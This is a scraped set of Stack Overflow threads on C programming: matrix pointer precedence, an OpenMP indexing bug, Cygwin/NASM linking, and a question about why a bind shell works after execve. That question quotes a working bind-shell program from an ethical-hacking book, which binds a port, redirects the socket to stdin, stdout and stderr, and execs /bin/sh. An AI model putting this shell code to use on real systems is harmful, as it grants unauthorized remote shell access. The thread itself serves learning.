0, "creation_date": 1518554356, "post_id": 48773931, "comment_id": 84552142, "body": "what is the input? are <code>r</code> and <code>c</code> larger than 255?"}, {"owner": {"reputation": 15485, "user_id": 3629249, "user_type": "registered", "profile_image": "https://graph.facebook.com/100000228362830/picture?type=large", "display_name": "user3629249", "link": "https://stackoverflow.com/users/3629249/user3629249"}, "edited": false, "score": 0, "creation_date": 1518626396, "post_id": 48773931, "comment_id": 84586344, "body": "to start, the program is missing the statement: <code>#include &lt;stdio.h&gt;</code>"}, {"owner": {"reputation": 7824, "user_id": 3899431, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/UeEzu.jpg?s=128&g=1", "display_name": "Luis Colorado", "link": "https://stackoverflow.com/users/3899431/luis-colorado"}, "edited": false, "score": 0, "creation_date": 1518638088, "post_id": 48773931, "comment_id": 84592700, "body": "<code>[]</code> Operator has higher precedence than <code>*</code>.  use parenthesis, <code>(*mat)[10][8]</code> is better than how you have written."}, {"owner": {"reputation": 1, "user_id": 5910058, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/87e1ce21ce04eb150f59eaec245d4ff8?s=128&d=identicon&r=PG&f=1", "display_name": "Jesper Juhl", "link": "https://stackoverflow.com/users/5910058/jesper-juhl"}, "edited": false, "score": 0, "creation_date": 1536171589, "post_id": 48773931, "comment_id": 91332281, "body": "compiles != correct"}], "answers": [{"tags": [], "owner": {"reputation": 28550, "user_id": 3796113, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/960488e3bdc769466c183faaf102f2f1?s=128&d=identicon&r=PG&f=1", "display_name": "user2736738", "link": "https://stackoverflow.com/users/3796113/user2736738"}, "is_accepted": false, "score": 1, "last_activity_date": 1518549055, "creation_date": 1518549055, "answer_id": 48773971, "question_id": 48773931, "link": "https://stackoverflow.com/questions/48773931/matrix-multiplication-program-crashes-at-runtime/48773971#48773971", "title": "Matrix multiplication program crashes at runtime", "body": "<p>It will be </p>\n\n<pre><code>(*mat1)[x][y]*=2;\n</code></pre>\n\n<p>Same goes for <code>mat3</code> in other function also. Because array subscript has higher precedence than <code>*</code> dereference. </p>\n\n<p>Here <code>matrice*</code> is of type <code>float (*)[][]</code> so you need to get the 2d array by dereferrencing it first.</p>\n"}, {"tags": [], "owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "is_accepted": true, "score": 4, "last_activity_date": 1518549095, "creation_date": 1518549095, "answer_id": 48773981, "question_id": 48773931, "link": "https://stackoverflow.com/questions/48773931/matrix-multiplication-program-crashes-at-runtime/48773981#48773981", "title": "Matrix multiplication program crashes at runtime", "body": "<p>It's a matter of <a href=\"http://en.cppreference.com/w/c/language/operator_precedence\" rel=\"nofollow noreferrer\"><em>operator precedence</em></a>. The expression <code>*mat1[x][y]*=2</code> is parsed as <code>*(mat1[x][y])*=2</code>.</p>\n\n<p>Use <code>(*mat1)[x][y]*=2</code> instead.</p>\n\n<p>Or rely on the fact that arrays naturally decays to pointers to their first element, and are passed as pointers anyway. So e.g.</p>\n\n<pre><code>void Molt(matrice mat1, int x, int y) //Procedura moltiplicazione\n{\n    ...\n    mat1[x][y]*=2;\n    ...\n}\n</code></pre>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7216598"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 48773981, "answer_count": 2, "score": 0, "last_activity_date": 1601544980, "creation_date": 1518548943, "last_edit_date": 1601544980, "question_id": 48773931, "link": "https://stackoverflow.com/questions/48773931/matrix-multiplication-program-crashes-at-runtime", "title": "Matrix multiplication program crashes at runtime", "body": "<p>I receive no error during compilation, however, when I execute it, the program crashes. I have deduced the error is the line with  <code>*mat3[x][y]=mat1[x][y]+mat2[x][y]</code>. What is happening here, and how can I fix it?</p>\n<pre><code>typedef float matrice[255][255];\n\nvoid Caricamento(matrice *, int , int , int );\nvoid Molt(matrice *, int , int ); //Prototipi\nvoid Somma(matrice , matrice , matrice *, int , int );\nvoid Stampa(matrice , int , int );\n\nint main()\n{\n    matrice A, B, C;\n    int r, c;\n    printf (&quot;Inserisci la dimensione delle matrici A e B per il calcolo 2*A+B:\\n&quot;);\n    scanf (&quot;%d&quot;, &amp;r);\n    scanf (&quot;%d&quot;, &amp;c);\n    Caricamento(&amp;A, r, c, 1);\n    Caricamento(&amp;A, r, c, 2);\n    Molt(&amp;A, r, c);\n    Somma(A, B, &amp;C, r, c);\n    Stampa(C, r, c);\n    return 0;\n}\n\nvoid Molt(matrice *mat1, int x, int y) //Procedura moltiplicazione\n{\n    int xi=0, yi=0; //Indici\n    while(xi&lt;x)\n    {\n        yi=0; //Reset indice\n        while (yi&lt;y)\n        {\n            *mat1[x][y]*=2; //Moltiplicazione\n            yi++;\n        }\n        xi++;\n    }\n}\n\nvoid Somma(matrice mat1, matrice mat2, matrice *mat3, int x, int y) //Procedura somma\n{\n    int xi=0, yi=0; //Indici\n    while(xi&lt;x)\n    {\n        yi=0; //Reset indice\n        while (yi&lt;y)\n        {\n            *mat3[x][y]=mat1[x][y]+mat2[x][y]; //Somma\n            yi++;\n        }\n        xi++;\n    }\n}\n</code></pre>\n"}, {"tags": ["c", "linux", "sockets", "file-descriptor", "execve"], "comments": [{"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518549284, "post_id": 48773917, "comment_id": 84549490, "body": "While the code is well-commented, its use of <a href=\"https://en.wikipedia.org/wiki/Magic_number_(programming)\" rel=\"nofollow noreferrer\"><i>magic numbers</i></a> and total lack of error checking still makes it bad."}, {"owner": {"reputation": 290, "user_id": 7427772, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/110ca972b1adb456c71100a18b1cf3d3?s=128&d=identicon&r=PG&f=1", "display_name": "Nark", "link": "https://stackoverflow.com/users/7427772/nark"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518549342, "post_id": 48773917, "comment_id": 84549516, "body": "The code is just C code to explain you what you&#39;re going to do, because it will be transformed into shellcode. So you obviously need to put some magic numbers in there."}, {"owner": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518549405, "post_id": 48773917, "comment_id": 84549557, "body": "In the <code>socket</code> call, do you know what the numbers <code>2</code>, <code>1</code> and <code>0</code> means? No? Then that&#39;s why magic numbers should not be used. Especially since the relevant headers are included, which contains the nice symbolic constants that corresponds to those numbers. Even when learning about exploits, good code is good code. And this code is not good."}, {"owner": {"reputation": 290, "user_id": 7427772, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/110ca972b1adb456c71100a18b1cf3d3?s=128&d=identicon&r=PG&f=1", "display_name": "Nark", "link": "https://stackoverflow.com/users/7427772/nark"}, "reply_to_user": {"reputation": 361156, "user_id": 440558, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/9ZYta.jpg?s=128&g=1", "display_name": "Some programmer dude", "link": "https://stackoverflow.com/users/440558/some-programmer-dude"}, "edited": false, "score": 0, "creation_date": 1518549511, "post_id": 48773917, "comment_id": 84549612, "body": "For a C program I agree, but this is just a test program that you will need to convert into assembly code yourself, and the book tells you what 2, 1 and 0 means in this case."}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 1, "creation_date": 1518553272, "post_id": 48773917, "comment_id": 84551572, "body": "File descriptors are stored in kernel, at least conceptually."}, {"owner": {"reputation": 290, "user_id": 7427772, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/110ca972b1adb456c71100a18b1cf3d3?s=128&d=identicon&r=PG&f=1", "display_name": "Nark", "link": "https://stackoverflow.com/users/7427772/nark"}, "reply_to_user": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1518554498, "post_id": 48773917, "comment_id": 84552221, "body": "@el.pescado So is the int value we get using functions such as open() pointing to a kernel thing?"}, {"owner": {"reputation": 17713, "user_id": 226648, "user_type": "registered", "accept_rate": 35, "profile_image": "https://www.gravatar.com/avatar/3196df423fd95dc4fce7dfadb8ec9953?s=128&d=identicon&r=PG", "display_name": "el.pescado", "link": "https://stackoverflow.com/users/226648/el-pescado"}, "edited": false, "score": 0, "creation_date": 1518599303, "post_id": 48773917, "comment_id": 84567899, "body": "@Nofix yes. Kernel maintains some information (including open files) about each running process, and file descriptors can be thought as <i>handles</i> to parts of that information."}], "answers": [{"tags": [], "owner": {"reputation": 158911, "user_id": 1687119, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f9c3036c1979d65847da3bdc271bb5b9?s=128&d=identicon&r=PG", "display_name": "dbush", "link": "https://stackoverflow.com/users/1687119/dbush"}, "is_accepted": true, "score": 3, "last_activity_date": 1518550589, "last_edit_date": 1518550589, "creation_date": 1518549338, "answer_id": 48774048, "question_id": 48773917, "link": "https://stackoverflow.com/questions/48773917/why-creating-a-remote-shell-using-execve-doesnt-overwrite-file-descriptors-and/48774048#48774048", "title": "Why creating a remote shell using execve doesn&#39;t overwrite file descriptors and socket?", "body": "<p>File descriptors are <strong>not</strong> closed when a new program is executed via one of the <code>exec</code> functions.  If they were, there would be no way to attach stdin / stdout / stderr in a terminal to the proper places.</p>\n\n<p>You missed the following paragraph:</p>\n\n<blockquote>\n  <p><strong>By default, file descriptors remain open across an <code>execve()</code></strong>.  File\n  descriptors that are marked close-on-exec are closed; see the\n  description\n            of <code>FD_CLOEXEC</code> in <code>fcntl(2)</code>.  (If a file descriptor is closed, this will cause the release of all record locks obtained on the\n  underlying file\n            by this process.  See <code>fcntl(2)</code> for details.)  POSIX.1 says that if file descriptors 0, 1, and 2 would otherwise be closed after a\n  successful\n            <code>execve()</code>,  and the process would gain privilege because the set-user_ID or set-group_ID mode bit was set on the executed file,\n  then the system may open an unspecified file for each of these file descriptors.  <strong>As a general principle, no portable  program,  whether \n  privileged  or\n            not, can assume that these three file descriptors will remain closed across an <code>execve()</code></strong>.</p>\n</blockquote>\n"}], "owner": {"reputation": 290, "user_id": 7427772, "user_type": "registered", "accept_rate": 73, "profile_image": "https://www.gravatar.com/avatar/110ca972b1adb456c71100a18b1cf3d3?s=128&d=identicon&r=PG&f=1", "display_name": "Nark", "link": "https://stackoverflow.com/users/7427772/nark"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 567, "favorite_count": 0, "accepted_answer_id": 48774048, "answer_count": 1, "score": 2, "last_activity_date": 1518550589, "creation_date": 1518548877, "last_edit_date": 1518549276, "question_id": 48773917, "link": "https://stackoverflow.com/questions/48773917/why-creating-a-remote-shell-using-execve-doesnt-overwrite-file-descriptors-and", "title": "Why creating a remote shell using execve doesn&#39;t overwrite file descriptors and socket?", "body": "<p>So I've got this code from <em>Gray Hat Hacking: The Ethical Hacker\u2019s Handbook, Fourth Edition</em> : </p>\n\n<pre><code>#include&lt;sys/socket.h&gt;                 // libraries used to make a socket\n#include&lt;netinet/in.h&gt;                 // defines the sockaddr structure\nint main(){\n        char * shell[2];               // prep for execve call\n        int server,client;             // file descriptor handles\n        struct sockaddr_in serv_addr;  // structure to hold IP/port vals\n        server=socket(2,1,0);   // build a local IP socket of type stream\n        serv_addr.sin_addr.s_addr=0; // set addresses of socket to all local\n        serv_addr.sin_port=0xBBBB; // set port of socket, 48059 here\n        serv_addr.sin_family=2;   // set native protocol family: IP\n        bind(server,(struct sockaddr *)&amp;serv_addr,0x10); // bind socket\n        listen(server,0);         // enter listen state, wait for connect\n        client=accept(server,0,0);// when connect, return client handle\n        /*connect client pipes to stdin,stdout,stderr */\n        dup2(client,0);                // connect stdin to client\n        dup2(client,1);                // connect stdout to client\n        dup2(client,2);                // connect stderr to client\n        shell[0]=\"/bin/sh\";            // first argument to execve\n        shell[1]=0;                    // terminate array with null\n        execve(shell[0],shell,0);      // pop a shell\n}\n</code></pre>\n\n<p>According to <a href=\"https://linux.die.net/man/2/execve\" rel=\"nofollow noreferrer\">execve man page</a>:</p>\n\n<blockquote>\n  <p>execve() does not return on success, and the text, data, bss, and stack of the calling process are overwritten by that of the program loaded. </p>\n</blockquote>\n\n<p>So shouldn't the return value of <code>socket()</code>, which -if I understood it well-, is a file descriptor, be overwritten? <br>\nAnd shouldn't redirection of file descriptors <code>stdin</code>, <code>stdout</code> and <code>stderr</code> be reset to default values? \nIf so, how could this program work?\n<br> I probably missunderstood something in about the <code>execve()</code> function, or about file descriptors. Or maybe I totaly missunderstood <code>socket()</code> function.\nAren't file descriptors stored either into the stack, either into bss section?</p>\n"}, {"tags": ["c", "openmp"], "comments": [{"owner": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 2, "creation_date": 1518545854, "post_id": 48773005, "comment_id": 84547783, "body": "#pragma omp <b>parallell</b> \u2026? Note that for such a small array, you&#39;d probably be much better off with <code>#pragma omp simd reduction(+:sum)</code>"}, {"owner": {"reputation": 404, "user_id": 8696281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60d09d55a3db6a849bf5a1403b0ddec9?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Xi", "link": "https://stackoverflow.com/users/8696281/jeff-xi"}, "reply_to_user": {"reputation": 13984, "user_id": 501126, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/839de8a602b21abf36e020bcb32959fe?s=128&d=identicon&r=PG", "display_name": "nemequ", "link": "https://stackoverflow.com/users/501126/nemequ"}, "edited": false, "score": 0, "creation_date": 1518546888, "post_id": 48773005, "comment_id": 84548300, "body": "Thank you! But this does not solve my problem. The result I got is: <code>PRAM_sum is 189303145009497269707511929525705110392653560754680655993098&zwnj;&#8203;01638787407325759278&zwnj;&#8203;01924394608816190511&zwnj;&#8203;85066297560313762484&zwnj;&#8203;15486077736078937003&zwnj;&#8203;70643687326848998248&zwnj;&#8203;60711358116769334570&zwnj;&#8203;78051859447928636757&zwnj;&#8203;32747392195206578176&zwnj;&#8203;.000000</code>"}], "answers": [{"tags": [], "owner": {"reputation": 606, "user_id": 2525083, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/muMuh.jpg?s=128&g=1", "display_name": "xcski", "link": "https://stackoverflow.com/users/2525083/xcski"}, "is_accepted": true, "score": 1, "last_activity_date": 1518548799, "creation_date": 1518548799, "answer_id": 48773899, "question_id": 48773005, "link": "https://stackoverflow.com/questions/48773005/how-to-make-openmp-running-correctly-in-subroutine-c-language/48773899#48773899", "title": "How to make openmp running correctly in subroutine (c language)", "body": "<p>You have an indexing error here. C is 0-indexed You never initialize A[0], and you try to access A[N], even though the array is only allocated out to N-1. So who knows what values are in A[0] and A[N] - they are probably quite large, giving you the garbage value. </p>\n"}], "owner": {"reputation": 404, "user_id": 8696281, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60d09d55a3db6a849bf5a1403b0ddec9?s=128&d=identicon&r=PG&f=1", "display_name": "Jeff Xi", "link": "https://stackoverflow.com/users/8696281/jeff-xi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 59, "favorite_count": 0, "accepted_answer_id": 48773899, "answer_count": 1, "score": 0, "last_activity_date": 1518548799, "creation_date": 1518545349, "question_id": 48773005, "link": "https://stackoverflow.com/questions/48773005/how-to-make-openmp-running-correctly-in-subroutine-c-language", "title": "How to make openmp running correctly in subroutine (c language)", "body": "<p>I am trying to compare the difference between openmp reduction sum and the normal serial summation of an array. But I only got garbage number from my subroutine \"fast_sum\", while the result in serial_sum is correct. I am not sure why... I can compile my code successfully using gcc-7 -fopenmp. Please help me and thank you in advance! </p>\n\n<pre><code>#include &lt;stdlib.h&gt;\n#include &lt;stdio.h&gt;\n#include &lt;math.h&gt;\n#include &lt;omp.h&gt;\n#include &lt;sys/time.h&gt;\n#define NUM_THREADS 8\n\n//////// serial /////////\ndouble serial_sum(double *A, int N){\ndouble sum=0.0;\nint i;\nfor(i=1;i&lt;=N;++i)\n    sum += A[i];\n\nreturn(sum);\n}\n\ndouble fast_sum(double *A, int N){\ndouble sum=0.0;\nint i;\n#pragma omp parallell for reduction(+:sum) num_threads(NUM_THREADS)\nfor (i =1; i&lt;=N; ++i)\n    sum += A[i];\n\nreturn(sum);\n}  \n\nint main(void)\n{\nint N = 256;\ndouble sum1, sum2, sum3;\ndouble *A;\nint i, h;\n\nA = (double*)malloc(N * sizeof(double));\n\nfor( i = 1; i&lt;=N;++i){\n    A[i] = i;\n}\n\n/* initialization A[N] */\n\nsum1 = serial_sum(A,N);\nprintf(\"normal_sum is %f\\n\", sum1);\nsum2 = fast_sum(A,N);\nprintf(\"fast_sum is %f\\n\", sum2);\n\nfree(A);\n}\n</code></pre>\n"}, {"tags": ["c", "gcc", "cygwin", "nasm"], "comments": [{"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1518547138, "post_id": 48772899, "comment_id": 84548427, "body": "First off Cygwin generates native files for Windows. Shared objects are usually named with a <code>.dll</code> extension on Windows (not .so). You can link with something like <code>gcc -shared -lcygwin Cyg64_01.o -o Cyg64_01.dll</code> . Among other things it is <code>-lcygwin</code> to link with the cygwin dll"}, {"owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "reply_to_user": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1518547218, "post_id": 48772899, "comment_id": 84548459, "body": "I am using Cygwin to get debug symbols, which I cannot get for Windows -- .pdb format is not documented, so no non-msoft compiler will output them.  If I get native Windows files, will I get debug symbols that I can use with GCC&#39;s GDB?  And yes, the file name is Cyg64_01.o; I just edited the question to correct that."}, {"owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "reply_to_user": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1518547496, "post_id": 48772899, "comment_id": 84548596, "body": "Your suggested compile string does output a dll; I notice that it&#39;s 134K in size, which is much larger than the 5K object file; that seems very large compared to Windows dlls I have created -- any thoughts?"}, {"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1518547713, "post_id": 48772899, "comment_id": 84548691, "body": "it outputs a <code>dll</code> if you use <code>-shared</code>. You can tell if you run the command <code>file Cyg64_01.dll</code> after. It should say <code>Cyg64_01.dll: PE32+ executable (DLL) (console) x86-64, for MS Windows</code> . Yes, it is larger. It has padding, headers, code. The DLL will be larger than the <code>.o</code>  file."}, {"owner": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1518547843, "post_id": 48772899, "comment_id": 84548747, "body": "You can strip it of the excess including the debug info with <code>strip Cyg64_01.dll</code>"}, {"owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "reply_to_user": {"reputation": 41564, "user_id": 3857942, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/hXLnN.jpg?s=128&g=1", "display_name": "Michael Petch", "link": "https://stackoverflow.com/users/3857942/michael-petch"}, "edited": false, "score": 0, "creation_date": 1518547946, "post_id": 48772899, "comment_id": 84548803, "body": "The size isn&#39;t an issue, really -- it&#39;s just larger compared to the .o than Windows dlls I have created.  I am now trying gdb with dwarf symbols."}], "owner": {"reputation": 1471, "user_id": 8276973, "user_type": "registered", "accept_rate": 56, "profile_image": "https://www.gravatar.com/avatar/96a6954bd630cf29b8529b41d9ce66fc?s=128&d=identicon&r=PG&f=1", "display_name": "RTC222", "link": "https://stackoverflow.com/users/8276973/rtc222"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 219, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1518546941, "creation_date": 1518544911, "last_edit_date": 1518546941, "question_id": 48772899, "link": "https://stackoverflow.com/questions/48772899/cygwin-linking-nasm-64-dll-to-c-library-using-ld", "title": "Cygwin linking NASM 64 dll to C library using ld", "body": "<p>Using Cygwin, I need to link a 64-bit NASM dll to the C library.  I compile with NASM and link with gcc's ld.  However, ld reports that it cannot find the C library, no matter what I try.  </p>\n\n<p>The NASM compile string is:  </p>\n\n<pre><code>nasm -f elf64 Cyg64_01.asm \n</code></pre>\n\n<p>The ld linker string is:</p>\n\n<pre><code>ld Cyg64_01.o -l cygwin1.dll -o Cyg64_01.so --verbose\n</code></pre>\n\n<p>Using just cygwin1, not cygwin1.dll, gives the same result.  </p>\n\n<p>The Cygwin manual says that its C library is newlib, but linking to newlib doesn't work.  An earlier post on Stack Overflow says:  \"The C library on Cygwin is cygwin1.dll (part of the cygwin package), which is based on newlib\" so I am using cygwin1.dll, located in Cygwin64\\bin.  </p>\n\n<p>Using the verbose option, I see that Cygwin does not search Cygwin64\\bin\\ for libraries, but if I include the full path it still doesn't find it.  </p>\n\n<p>In the \"Mapping Path Names\" section of the Cygwin manual, it says that new paths are added to the Cygwin Mount Table; using the linux mount command, I see that Cygwin64\\bin\\ is already in the mount table.  </p>\n\n<p>My question is:  (1) am I linking to the right C library (for an assembler program, not a C or C++ program), and (2) do I need to reference the path differently?  </p>\n\n<p>Thanks for any help.  </p>\n"}]